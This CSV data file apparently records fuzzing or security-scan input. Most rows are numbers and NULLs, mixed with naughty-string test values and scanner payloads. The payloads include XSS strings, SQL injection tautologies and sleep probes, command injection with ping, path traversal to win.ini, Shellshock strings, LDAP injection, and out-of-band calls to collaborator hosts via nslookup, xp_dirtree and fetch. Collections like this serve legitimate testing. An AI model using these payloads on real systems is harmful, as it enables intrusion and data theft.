Number;Suffix;
45;NULL;
22;A;
10;;
938;%3cimg%20src%3dx%20onerror%3d%5cx11%22javascript%3aalert(1)%22%3e;
938;;
68;;
923;;
17;NULL;
96;;
68;;
43;NULL;
8;;
10;;
938;;
19;NULL;
14;;
24;NULL;
75;/.../address;
4;NULL;
1;NULL;
1;NULL;
34;a;
938;;
75;;
3;NULL;
938;;
938;#;String%20which%20can%20reveal%20system%20files%20when%20parsed%20by%20a%20badly%20configured%20XML%20parser
938;;
7;a;
3;NULL;
34;a;
938;;
83;NULL;
501;NULL;
11;;
10;;
54;;
30;;
26;A;
4;NULL;
7;A;
1;NULL;
938;;
938;;
80;NULL;
75;;
4;NULL;
3;NULL;
75;66838391' or '7270'='7270';
7518993926' or '6350'='6350';;
1;;
938;;
75;;
75;jm9twf0h48zfq4vrlu42x4cj5ab4zvnnfb7yzmo;
8;NULL;
938;;
75;;
938;;
75;;
7;;
2;NULL;
39;NULL;
19;NULL;
24;NULL;
1;;
938;;
9;;
1;NULL;
501;NULL;
71;NULL;
26;A;
47;;
1;NULL;
1;NULL;
25;NULL;
41;NULL;
938;;
61;;
45;D;
938;;
4;NULL;
17;;
24;NULL;
938;#%20Whitespace%3a%20all%20of%20the%20characters%20with%20category%20Zs,%20Zl,%20or%20Zp%20(in%20Unicode;
75;;
200;;
8;;
1;;
68;NULL;
26;A;
17;NULL;
5;;
938;;
75;;
7;A;
1;NULL;
938;;
938;;
83;NULL;
33;;
30;;
22;NULL;
17;;
39;NULL;
25;NULL;
105;A;
4;;
938;;
39;NULL;
39;NULL;
938;;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx83expression(javascript%3aalert(1)%22%3eDEF;
9;NULL;
75;;
3;NULL;
4;NULL;
24;NULL;
3;;
1;NULL;
938;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
938;#%20%20%20IRC%20specific%20strings;
8;;
4;NULL;
938;;
3;NULL;
938;%22%20autofocus%20onkeyup%3d%22javascript%3aalert(123);
4;NULL;
10;;
71;NULL;
3;;
40;;
4;NULL;
10;;
15;;
24;NULL;
75;;
938;𝚃𝚑𝚎%20𝚚𝚞𝚒𝚌𝚔%20𝚋𝚛𝚘𝚠𝚗%20𝚏𝚘𝚡%20𝚓𝚞𝚖𝚙𝚜%20𝚘𝚟𝚎𝚛%20𝚝𝚑𝚎%20𝚕𝚊𝚣𝚢%20𝚍𝚘𝚐;
938;;
49;;
12;NULL;
75;;
10;NULL;
938;;
3;NULL;
938;#;Strings%20which%20contain%20two-byte%20characters%3a%20can%20cause%20rendering%20issues%20or%20character-length%20issues
3;NULL;
938;;
8;;
11;;
26;A;
8;NULL;
80;NULL;
75;;
34;a;
75;;
26;A;
13;NULL;
80;NULL;
938;;
68;;
3;NULL;
26;A;
8;;
80;;
11;;
938;;
111;;
25;NULL;
788;;
71;NULL;
938;;
24;NULL;
75;;
17;NULL;
34;a;
10;;
1;NULL;
111;;
FALSE;;
938;;
938;;
1;NULL;
1;NULL;
83;NULL;
1;;
4;NULL;
212;NULL;
75;;
8;NULL;
25;NULL;
247;NULL;
75;;
938;%3ca%20href%3d%22%5cxE2%5cx80%5cx89javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
39;NULL;
22;NULL;
25;A;
1;NULL;
37;;
34;a;
938;1%20000,00;
3;NULL;
71;NULL;
938;;
60;NULL;
938;;
34;a;
938;;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx82expression(javascript%3aalert(1)%22%3eDEF;
75;nqsvj{{.}}zd42m{{..}}t389s;
9;;
938;%3cimg[a][b][c]src[d]%3dx[e]onerror%3d[f]%22alert(1)%22%3e;
938;()%20%7b%200%3b%20%7d%3b%20touch%20%2ftmp%2fblns%2eshellshock1%2efail%3b;
26;A;
17;;
10;;
26;A;
83;NULL;
14;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
3;NULL;
938;;
39;NULL;
75;;
1;NULL;
3;NULL;
22;NULL;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
24;;
938;;
12;;
3;NULL;
4;NULL;
68;NULL;
9;;
501;NULL;
2;NULL;
938;;
938;;
24;NULL;
75;;
1;;
938;%22%3atest%22;
938;;
17;NULL;
71;NULL;
71;NULL;
20;NULL;
938;%3cimg%20src%3dx%20onerror%3d%5cx00%22javascript%3aalert(1)%22%3e;
8;;
938;;
1;NULL;
71;NULL;
9;NULL;
39;NULL;
99;;
243;2;
938;;
34;a;
12;;
13;;
75;;
938;;
109;;
938;;
71;;
938;;
22;NULL;
20;;
938;;
52;NULL;
938;1%2e000,00;
68;NULL;
938;;
4;NULL;
938;;
938;#;
71;NULL;
5;NULL;
15;A;
25;;
34;a;
75;;
938;'%3e%3cscript%3ealert(123)%3c%2fscript%3e;
22;NULL;
8;NULL;
50;;
10;;
45;NULL;
938;#;Strings%20which%20may%20be%20used%20elsewhere%20in%20code
34;a;
113;;
938;Dick%20Van%20Dyke;
75;;
75;;
75 and 6230=62300-- ;;
4;NULL;
9;NULL;
938;#;
3;NULL;
75;./address;
19;;
938;;
938;;
938;;
12;;
4;NULL;
938;;
1;NULL;
32;NULL;
938;;
22;a;
34;a;
71;NULL;
9;NULL;
938;;
938;Horniman%20Museum;
938;;
150;NULL;
11;;
938;;
75;;
25;NULL;
203;;
938;;
938;;
2;NULL;
8;;
25;NULL;
17;NULL;
83;NULL;
24;NULL;
7;A;
26;A;
75;;
75;;
22;;
938;;
3;NULL;
71;NULL;
938;;
938;;
83;NULL;
11;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
99;;
938;;
1;;
17;NULL;
24;NULL;
75;;
8;NULL;
68;NULL;
3;NULL;
71;NULL;
938;;
3;NULL;
938;;
4;NULL;
1;;
938;;
4;NULL;
75;;
"759p14jbo5iz&#65;0chneexqs2";;
2;;
9;NULL;
11;;
3;NULL;
24;NULL;
938;;
24;3;
1;NULL;
75;'+sleep(20.to_i)+';
938;;
3;NULL;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx80expression(javascript%3aalert(1)%22%3eDEF;
22;NULL;
34;NULL;
25;NULL;
75;;
938;;
75;;
71;NULL;
83;NULL;
88;A;
5;;
1;NULL;
1;NULL;
24;;
938;;
938;;
938;;
1;NULL;
75;;
1;NULL;
22;NULL;
4;NULL;
938;%3cimg%20%5cx11src%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
938;;
111;;
938;;
26;A;
39;NULL;
26;A;
75;gi42tdsnpr;
938;;
3;NULL;
71;NULL;
8;NULL;
26;A;
938;;
1;NULL;
2;;
938;(null);
68;;
938;;
938;;
1;NULL;
71;NULL;
938;;
938;;
7;A;
7;A;
938;;
27;;
116;NULL;
938;;
13;;
8;;
7;A;
1;;
68;NULL;
71;NULL;
3;NULL;
938;;
938;;
3;NULL;
14;;
24;NULL;
1;NULL;
9;NULL;
8;Skûtmakker;
938;;
938;1%20000%2e00;
938;;
3;;
501;NULL;
80;NULL;
938;;
8;;
20;NULL;
1ads5w2bgxÁoultm733c2;;
GmViWQ7xnRBF0GxAVXQtOCiOnm3NcczeXO6A8dWndOs=;;
1;;
7;;
32;;
938;;
39;NULL;
938;;
26;A;
938;;
83;NULL;
938;;
938;;
938;;
24;NULL;
938;;
938;%22'%22'%22''''%22;
3;NULL;
938;%3cIMG%20SRC%3d%22jav%26#x09%3bascript%3aalert('XSS')%3b%22%3e;
938;;
75;;
938;;
32;;
938;;
83;NULL;
938;;
938;Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮;
157;;
39;NULL;
8;NULL;
1;NULL;
75;;
938;Penistone%20Community%20Church;
938;%3ca%20href%3d%22%5cxC2%5cxA0javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
4;;
2;;
938;;
938;None;
60;NULL;
24;NULL;
139;NULL;
83;NULL;
8;NULL;
10;;
20;;
938;🇺🇸🇷🇺🇸🇦;
96;;
8;NULL;
1;NULL;
4;NULL;
938;0,0,0;
9;;
80;NULL;
4;NULL;
938;;
938;;
65;NULL;
938;;
1;NULL;
1;NULL;
24;NULL;
938;;
71;NULL;
71;NULL;
5;NULL;
1;;
1;NULL;
71;;
32;;
150;NULL;
7;;
1;NULL;
128;;
19;NULL;
8;NULL;
17;NULL;
147;;
938;;
938;;
26;NULL;
26;A;
83;NULL;
71;NULL;
75;;
938;;
938;;
39;NULL;
5;;
80;NULL;
75;;
938;#;
39;NULL;
938;;
26;A;
42;;
71;NULL;
4;NULL;
26;A;
938;But%20now%2e%2e%2e[20Cfor%20my%20greatest%20trick%2e%2e%2e[8m;
41;;
26;A;
938;#%20appear%20in%20input%2e;
938;;
68;NULL;
34;a;
48;;
26;A;
75;;
19;NULL;
17;NULL;
75;;
7594863905' or 4337=4337-- ;;
4;NULL;
4;NULL;
247;NULL;
938;;
80;NULL;
75;;
25;NULL;
938;¸˛Ç◊ı˜Â¯˘¿;
20;NULL;
75;;
938;%22%60'%3e%3cscript%3e%5cx2Bjavascript%3aalert(1)%3c%2fscript%3e;
1;;
2;NULL;
24;NULL;
938;;
17;NULL;
200;NULL;
938;;
938;;
7;A;
501;NULL;
71;NULL;
938;#;Script%20Injection
10;;
1;;
1;NULL;
3;NULL;
39;NULL;
39;NULL;
938;-%2e;
3;NULL;
31;NULL;
2;C;
938;;
1;NULL;
"(function(){if(typeof aylne==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<20000);aylne=1;}}())";;
4;E;
26;A;
71;NULL;
40;NULL;
75;;
1;NULL;
10;NULL;
17;NULL;
26;A;
9;NULL;
938;;
1;NULL;
26;A;
25;NULL;
8;NULL;
3;NULL;
110;;
71;NULL;
8;NULL;
143;A;
24;NULL;
3;NULL;
39;NULL;
938;;
26;A;
938;;
19;;
17;NULL;
41;NULL;
938;(ﾉಥ益ಥ）ﾉ﻿%20┻━┻;
39;NULL;
938;#%20The%20next%20line%20may%20appear%20to%20be%20blank%20or%20mojibake%20in%20some%20viewers%2e;
12;;
938;和製漢語;
938;;
938;;
3;NULL;
39;NULL;
938;;
938;;
39;NULL;
938;;
938;;
14;;
938;;
39;NULL;
501;NULL;
5;;
10;;
83;NULL;
938;;
2;NULL;
1;NULL;
1;NULL;
938;;
93;;
1;NULL;
29;;
13;NULL;
938;%7b%22__class%22%3a%22null%22,%22A%22%3a%22B%22%7d;
1;;
11;;
75;NULL;
938;１２３;
22;NULL;
3;NULL;
19;NULL;
39;NULL;
75;;
17;NULL;
2;NULL;
17;NULL;
938;;
938;;
1;;
10;;
8;NULL;
938;;
39;NULL;
938;;
7;A;
938;;
83;NULL;
150;NULL;
22;a;
42;;
2;NULL;
39;NULL;
(select*from(select(sleep(20)))a);;
2;a;
22;NULL;
6;;
39;NULL;
48;;
39;NULL;
80;NULL;
938;مُنَاقَشَةُ%20سُبُلِ%20اِسْتِخْدَامِ%20اللُّغَةِ%20فِي%20النُّظُمِ%20الْقَائِمَةِ%20وَفِيم%20يَخُصَّ%20التَّطْبِيقَاتُ%20الْحاسُوبِيَّةُ،%20;
26;A;
2;NULL;
24;NULL;
50;NULL;
938;;
938;;
71;NULL;
21;;
11;;
1;;
8;NULL;
22;NULL;
25;NULL;
5;;
501;;
501;NULL;
83;NULL;
75;;
8;;
22;a;
45;NULL;
200;NULL;
4;NULL;
71;NULL;
938;;
4;NULL;
938;;
25;NULL;
938;;
938;%7b%22toString%22%3a%22while(1)%3b%22%7d;
1;NULL;
938;ABC%3cdiv%20style%3d%22x%3a%5cx0Cexpression(javascript%3aalert(1)%22%3eDEF;
938;;
0;;
71;NULL;
1;NULL;
938;;
938;;
7;A;
71;NULL;
75;;
26;A;
71;NULL;
1;NULL;
24;NULL;
68;NULL;
15;;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx86expression(javascript%3aalert(1)%22%3eDEF;
938;;
17;;
27;NULL;
179;NULL;
88;A;
22;;
1;NULL;
305;;
"'""><svg/onload=fetch`//tda3nprrviqphem1c4vcoe3twk2eq5ex4lw8nwc\.burpcollaborator.net`>";;
938;;
14;;
1;NULL;
75;;
2;NULL;
13;NULL;
80;NULL;
39;NULL;
19;;
13;NULL;
88;A;
0;;
938;;
938;;
938;;
938;;
3;NULL;
212;NULL;
4;NULL;
17;NULL;
938;;
938;;
938;;
938;;
9;NULL;
79;;
938;%7b%22valueOf%22%3a%22while(1)%3b%22%7d;
26;A;
938;;
71;NULL;
71;NULL;
938;;
19;NULL;
75;;
938;;
938;;
75&echo sthquyxe25 l1xavude2k&;;
7;;
24;NULL;
5;;
115;;
22;NULL;
19;NULL;
4;NULL;
17;;
22;a;
75;;
24;NULL;
938;;
938;;
938;__ﾛ(,_,%2a);
938;%7b%220%22%3a[1]%7d;
12;;
4;NULL;
34;a;
2;NULL;
19;;
ohhV2gjLEC0dIXxT3Fgko6eVwcGkTpcb8Bq52joqy78=;;
938;;
139;;
501;;
7;;
150;NULL;
100;;
938;;
938;;
331;;
19;NULL;
2;;
938;#;Command%20Injection%20(Ruby)
75;../../../../../../../../../../../../../../../../windows/win.ini;
938;%3cIMG%20%22%22%22%3e%3cSCRIPT%3ealert(%22XSS%22)%3c%2fSCRIPT%3e%22%3e;
7;;
22;A;
71;NULL;
150;NULL;
26;A;
938;;
14;;
938;;
26;A;
938;;
200;NULL;
8;;
150;NULL;
8;NULL;
39;NULL;
1;;
83;NULL;
34;a;
2k6ipVBvJpPq4ZDZNgofMXk8mKGtreUdk1M6b1IKzhw=;;
21;NULL;
45;NULL;
938;;
2;NULL;
938;;
938;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
133;;
75;|ping -c 21 127.0.0.1||x;
1;NULL;
110;a;
938;;
26;A;
938;;
80;NULL;
75;;
39;NULL;
938;;
38;A;
2;;
1;;
212;NULL;
1;NULL;
40;NULL;
80;NULL;
52;;
1;NULL;
400;;
39;NULL;
56;;
938;;
39;NULL;
938;;
80;NULL;
11;;
938;;
6;;
938;;
22;;
68;NULL;
938;;
938;;
938;;
17;NULL;
8;NULL;
75;;
25;NULL;
75;;
2;NULL;
938;%3c%3e%3f%3a%22%7b%7d%7c_%2b;
1;;
1;NULL;
68;NULL;
200;NULL;
2;NULL;
4;NULL;
26;A;
140;;
3;NULL;
3;T;
11;;
22;a;
17;NULL;
71;NULL;
938;;
19;NULL;
19;;
5;;
70;;
83;NULL;
4;NULL;
159;;
45;NULL;
938;;
NaN;;
15;NULL;
39;NULL;
75;;
212;NULL;
36;A;
938;;
9;;
35;;
75;;
68;NULL;
14;;
938;;
938;בְּרֵאשִׁית,%20בָּרָא%20אֱלֹהִים,%20אֵת%20הַשָּׁמַיִם,%20וְאֵת%20הָאָרֶץ;
1;;
3;;
938;;
150;;
17;NULL;
938;;
71;NULL;
24;NULL;
938;;
10;NULL;
39;NULL;
938;%3ca%20href%3d%22%5cx11javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
39;NULL;
2;NULL;
83;NULL;
247;NULL;
40;;
1;NULL;
938;;
938;;
71;NULL;
938;;
8;;
938;%3cIMG%20SRC%3d%20onmouseover%3d%22alert('xxs')%22%3e;
13;;
22;NULL;
35;;
938;#;
83;NULL;
39;NULL;
80;NULL;
26;A;
938;;
4;NULL;
17;NULL;
13;NULL;
938;;
938;;
68;NULL;
39;NULL;
4;NULL;
78;;
938;ﷺ;
39;NULL;
200;;
938;;
75;;
75;;
938;;
1;NULL;
apcpwci3fu)(objectClass=*;;
938;Linda%20Callahan;
8;NULL;
86;;
3;NULL;
4;NULL;
4;NULL;
243;2;
26;A;
938;%3cimg%20%5cx34src%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
938;;
2;A;
39;NULL;
938;;
938;;
938;%22%5cu0100%5cu0101%5cu0102%5cu0103%5cu0104%5cu0105%5cu0106%5cu0107%5cu0108%5cu0109%5cu010a%5cu010b%5cu010c%5cu010d%5cu010e%5cu010f%5cu0110%5cu0111%5cu0112%5cu0113%5cu0114%5cu0115%5cu0116%5cu0117%5cu0118%5cu0119%5cu011a%5cu011b%5cu011c%5cu011d%5cu011e%5cu011f%5cu0120%5cu0121%5cu0122%5cu0123%5cu0124%5cu0125%5cu0126%5cu0127%5cu0128%5cu0129%5cu012a%5cu012b%5cu012c%5cu012d%5cu012e%5cu012f%5cu0130%5cu0131%5cu0132%5cu0133%5cu0134%5cu0135%5cu0136%5cu0137%5cu0138%5cu0139%5cu013a%5cu013b%5cu013c%5cu013d%5cu013e%5cu013f%5cu0140%5cu0141%5cu0142%5cu0143%5cu0144%5cu0145%5cu0146%5cu0147%5cu0148%5cu0149%5cu014a%5cu014b%5cu014c%5cu014d%5cu014e%5cu014f%5cu0150%5cu0151%5cu0152%5cu0153%5cu0154%5cu0155%5cu0156%5cu0157%5cu0158%5cu0159%5cu015a%5cu015b%5cu015c%5cu015d%5cu015e%5cu015f%5cu0160%5cu0161%5cu0162%5cu0163%5cu0164%5cu0165%5cu0166%5cu0167%5cu0168%5cu0169%5cu016a%5cu016b%5cu016c%5cu016d%5cu016e%5cu016f%5cu0170%5cu0171%5cu0172%5cu0173%5cu0174%5cu0175%5cu0176%5cu0177%5cu0178%5cu0179%5cu017a%5cu017b%5cu017c%5cu017d%5cu017e%5cu017f%5cu0180%5cu0181%5cu0182%5cu0183%5cu0184%5cu0185%5cu0186%5cu0187%5cu0188%5cu0189%5cu018a%5cu018b%5cu018c%5cu018d%5cu018e%5cu018f%5cu0190%5cu0191%5cu0192%5cu0193%5cu0194%5cu0195%5cu0196%5cu0197%5cu0198%5cu0199%5cu019a%5cu019b%5cu019c%5cu019d%5cu019e%5cu019f%5cu01a0%5cu01a1%5cu01a2%5cu01a3%5cu01a4%5cu01a5%5cu01a6%5cu01a7%5cu01a8%5cu01a9%5cu01aa%5cu01ab%5cu01ac%5cu01ad%5cu01ae%5cu01af%5cu01b0%5cu01b1%5cu01b2%5cu01b3%5cu01b4%5cu01b5%5cu01b6%5cu01b7%5cu01b8%5cu01b9%5cu01ba%5cu01bb%5cu01bc%5cu01bd%5cu01be%5cu01bf%5cu01c0%5cu01c1%5cu01c2%5cu01c3%5cu01c4%5cu01c5%5cu01c6%5cu01c7%5cu01c8%5cu01c9%5cu01ca%5cu01cb%5cu01cc%5cu01cd%5cu01ce%5cu01cf%5cu01d0%5cu01d1%5cu01d2%5cu01d3%5cu01d4%5cu01d5%5cu01d6%5cu01d7%5cu01d8%5cu01d9%5cu01da%5cu01db%5cu01dc%5cu01dd%5cu01de%5cu01df%5cu01e0%5cu01e1%5cu01e2%5cu01e3%5cu01e4%5cu01e5%5cu01e6%5cu01e7%5cu01e8%5cu01e9%5cu01ea%5cu01eb%5cu01ec%5cu01ed%5cu01ee%5cu01ef%5cu01f0%5cu01f1%5cu01f2%5cu01f3%5cu01f4%5cu01f5%5cu01f6%5cu01f7%5cu01f8%5cu01f9%5cu01fa%5cu01fb%5cu01fc%5cu01fd%5cu01fe%5cu01ff%5cu0200%5cu0201%5cu0202%5cu0203%5cu0204%5cu0205%5cu0206%5cu0207%5cu0208%5cu0209%5cu020a%5cu020b%5cu020c%5cu020d%5cu020e%5cu020f%5cu0210%5cu0211%5cu0212%5cu0213%5cu0214%5cu0215%5cu0216%5cu0217%5cu0218%5cu0219%5cu021a%5cu021b%5cu021c%5cu021d%5cu021e%5cu021f%5cu0220%5cu0221%5cu0222%5cu0223%5cu0224%5cu0225%5cu0226%5cu0227%5cu0228%5cu0229%5cu022a%5cu022b%5cu022c%5cu022d%5cu022e%5cu022f%5cu0230%5cu0231%5cu0232%5cu0233%5cu0234%5cu0235%5cu0236%5cu0237%5cu0238%5cu0239%5cu023a%5cu023b%5cu023c%5cu023d%5cu023e%5cu023f%5cu0240%5cu0241%5cu0242%5cu0243%5cu0244%5cu0245%5cu0246%5cu0247%5cu0248%5cu0249%5cu024a%5cu024b%5cu024c%5cu024d%5cu024e%5cu024f%5cu0250%5cu0251%5cu0252%5cu0253%5cu0254%5cu0255%5cu0256%5cu0257%5cu0258%5cu0259%5cu025a%5cu025b%5cu025c%5cu025d%5cu025e%5cu025f%5cu0260%5cu0261%5cu0262%5cu0263%5cu0264%5cu0265%5cu0266%5cu0267%5cu0268%5cu0269%5cu026a%5cu026b%5cu026c%5cu026d%5cu026e%5cu026f%5cu0270%5cu0271%5cu0272%5cu0273%5cu0274%5cu0275%5cu0276%5cu0277%5cu0278%5cu0279%5cu027a%5cu027b%5cu027c%5cu027d%5cu027e%5cu027f%5cu0280%5cu0281%5cu0282%5cu0283%5cu0284%5cu0285%5cu0286%5cu0287%5cu0288%5cu0289%5cu028a%5cu028b%5cu028c%5cu028d%5cu028e%5cu028f%5cu0290%5cu0291%5cu0292%5cu0293%5cu0294%5cu0295%5cu0296%5cu0297%5cu0298%5cu0299%5cu029a%5cu029b%5cu029c%5cu029d%5cu029e%5cu029f%5cu02a0%5cu02a1%5cu02a2%5cu02a3%5cu02a4%5cu02a5%5cu02a6%5cu02a7%5cu02a8%5cu02a9%5cu02aa%5cu02ab%5cu02ac%5cu02ad%5cu02ae%5cu02af%5cu02b0%5cu02b1%5cu02b2%5cu02b3%5cu02b4%5cu02b5%5cu02b6%5cu02b7%5cu02b8%5cu02b9%5cu02ba%5cu02bb%5cu02bc%5cu02bd%5cu02be%5cu02bf%5cu02c0%5cu02c1%5cu02c2%5cu02c3%5cu02c4%5cu02c5%5cu02c6%5cu02c7%5cu02c8%5cu02c9%5cu02ca%5cu02cb%5cu02cc%5cu02cd%5cu02ce%5cu02cf%5cu02d0%5cu02d1%5cu02d2%5cu02d3%5cu02d4%5cu02d5%5cu02d6%5cu02d7%5cu02d8%5cu02d9%5cu02da%5cu02db%5cu02dc%5cu02dd%5cu02de%5cu02df%5cu02e0%5cu02e1%5cu02e2%5cu02e3%5cu02e4%5cu02e5%5cu02e6%5cu02e7%5cu02e8%5cu02e9%5cu02ea%5cu02eb%5cu02ec%5cu02ed%5cu02ee%5cu02ef%5cu02f0%5cu02f1%5cu02f2%5cu02f3%5cu02f4%5cu02f5%5cu02f6%5cu02f7%5cu02f8%5cu02f9%5cu02fa%5cu02fb%5cu02fc%5cu02fd%5cu02fe%5cu02ff%22;
938;;
938;%7b%220%22%3a[1,2]%7d;
"-->'-->`--><!--#set var=8ca"" value=""7b9hl3p5tw""--><!--#set var=""aec"" value=""9dbjn5r7vy""--><!--#echo var=""8ca""--><!--#echo var=""aec""--><!--#exec cmd=""nslookup -q=cname uyw48qcsgjbq2f72x5gd9fouhlnfb6zyxmp9gx5.burpcollaborator.net"" -->";;
69;;
71;NULL;
26;A;
1;B;
1;NULL;
938;%3ca%20href%3d%22%5cxE2%5cx80%5cxA8javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
26;A;
1;NULL;
22;a;
4;NULL;
938;http%3a%2f%2fwww%2ecum%2eqc%2eca%2f;
5;NULL;
2;NULL;
39;;
938;;
12;NULL;
8;NULL;
17;NULL;
75;;
1;NULL;
938;%3ca%20href%3d%22%5cxE2%5cx80%5cx87javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
938;%3cSCRIPT%2fSRC%3d%22http%3a%2f%2fha%2eckers%2eorg%2fxss%2ejs%22%3e%3c%2fSCRIPT%3e;
2;NULL;
938;;
938;;
19;NULL;
7;A;
938;;
25;NULL;
5;NULL;
75;;
7;;
75;;
938;#;Strings%20which%20can%20be%20accidentally%20expanded%20into%20different%20strings%20if%20evaluated%20in%20the%20wrong%20context,%20e%2eg%2e%20used%20as%20a%20printf%20format%20string%20or%20via%20Perl%20or%20shell%20eval%2e%20Might%20expose%20sensitive%20data%20from%20the%20program%20doing%20the%20interpolation,%20or%20might%20just%20represent%20the%20wrong%20string%2e
70;;
75;;
1;c;
20;NULL;
938;;
25;NULL;
938;;
938;;
4;NULL;
247;NULL;
1;NULL;
24;NULL;
8;NULL;
14;;
28;;
938;()%20%7b%20_%3b%20%7d%20%3e_[$($())]%20%7b%20touch%20%2ftmp%2fblns%2eshellshock2%2efail%3b%20%7d;
68;NULL;
2;;
938;;
938;🏳0🌈️;
45;NULL;
75;;
70;A;
938;%7b%22%5cx00%22%3a[1]%7d;
31;;
24;NULL;
938;;
2;;
938;;
10;;
80;NULL;
68;;
938;A%3a;
1;;
75;;
2;NULL;
75;;
17;NULL;
14;;
4;NULL;
1;NULL;
75;;
1E+96;;
1;NULL;
62;;
938;;
39;NULL;
8;NULL;
10;;
71;NULL;
36;;
1;NULL;
68;NULL;
25;NULL;
42;;
8;NULL;
83;NULL;
17;NULL;
8;NULL;
22;NULL;
39;NULL;
27;;
71;NULL;
938;;
75;;
7;A;
75;;
5;NULL;
938;%3ca%20href%3d%22%5cxE2%5cx80%5cx86javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
938;;
75;;
51;;
423;;
3;NULL;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
68;;
938;;
938;;
5;NULL;
938;;
938;1#SNAN;
938;;
938;;
938;;
75;;
75;;
75;;
71;NULL;
1;NULL;
247;NULL;
75;;
71;NULL;
938;;
22;NULL;
938;%7b%22constructor%22%3a%22null%22%7d;
17;NULL;
8;;
938;;
938;#;Strings%20which%20contain%20Emoji%3b%20should%20be%20the%20same%20behavior%20as%20two-byte%20characters,%20but%20not%20always
"75');declare @q varchar(99);set @q='\\z559fvjxnoiv9ke74anigkvzoqukib62zqrdi17.burpcollab'+'orator.net\fkr'; exec master.dbo.xp_dirtree @q;-- ";;
8;NULL;
68;NULL;
140;C;
26;A;
938;;
99;;
938;%3ca%20href%3d%22javascript%5cx0D%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
75;' and '3457'='3457;
938;;
938;;
1;NULL;
938;;
8;NULL;
12;;
938;;
938;;
75;;
44;;
5;NULL;
150;;
7580034104' or 6560=6562-- ;;
938;;
938;;
1;;
3;NULL;
22;B;
2;;
938;;
4;NULL;
116;;
75;;
22;;
26;A;
17;NULL;
19;NULL;
3;NULL;
19;NULL;
8;;
1;;
3;NULL;
17;NULL;
http://h7prhdlfp6kdb2gp6sp0i2xhq8w2kt8jwbj27r.burpcollaborator.net/?75;;
938;;
45;;
19;NULL;
80;NULL;
938;%3ciframe%20src%3dhttp%3a%2f%2fha%2eckers%2eorg%2fscriptlet%2ehtml%20%3c;
17;NULL;
179;NULL;
13;;
938;;
938;;
39;NULL;
938;;
75;;
83;NULL;
24;NULL;
938;;
938;;
938;;
938;#%20Non-whitespace%20C1%20controls%3a%20U%2b0080%20through%20U%2b0084%20and%20U%2b0086%20through%20U%2b009F%2e;
24;NULL;
938;;
938;;
39;NULL;
73;;
71;NULL;
75;;
4;NULL;
938;'%20autofocus%20onkeyup%3d'javascript%3aalert(123);
24;NULL;
75;;
938;;
45;NULL;
39;NULL;
3;NULL;
938;;
938;medieval%20erection%20of%20parapets;
71;NULL;
116;;
1;NULL;
39;NULL;
938;%22%3balert(123)%3bt%3d%22;
83;NULL;
83;NULL;
34;a;
71;NULL;
75;yxh/;
938;;
938;;
938;;
10;;
25;NULL;
938;;
938;;
938;%3ca%20href%3d%22%5cx19javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
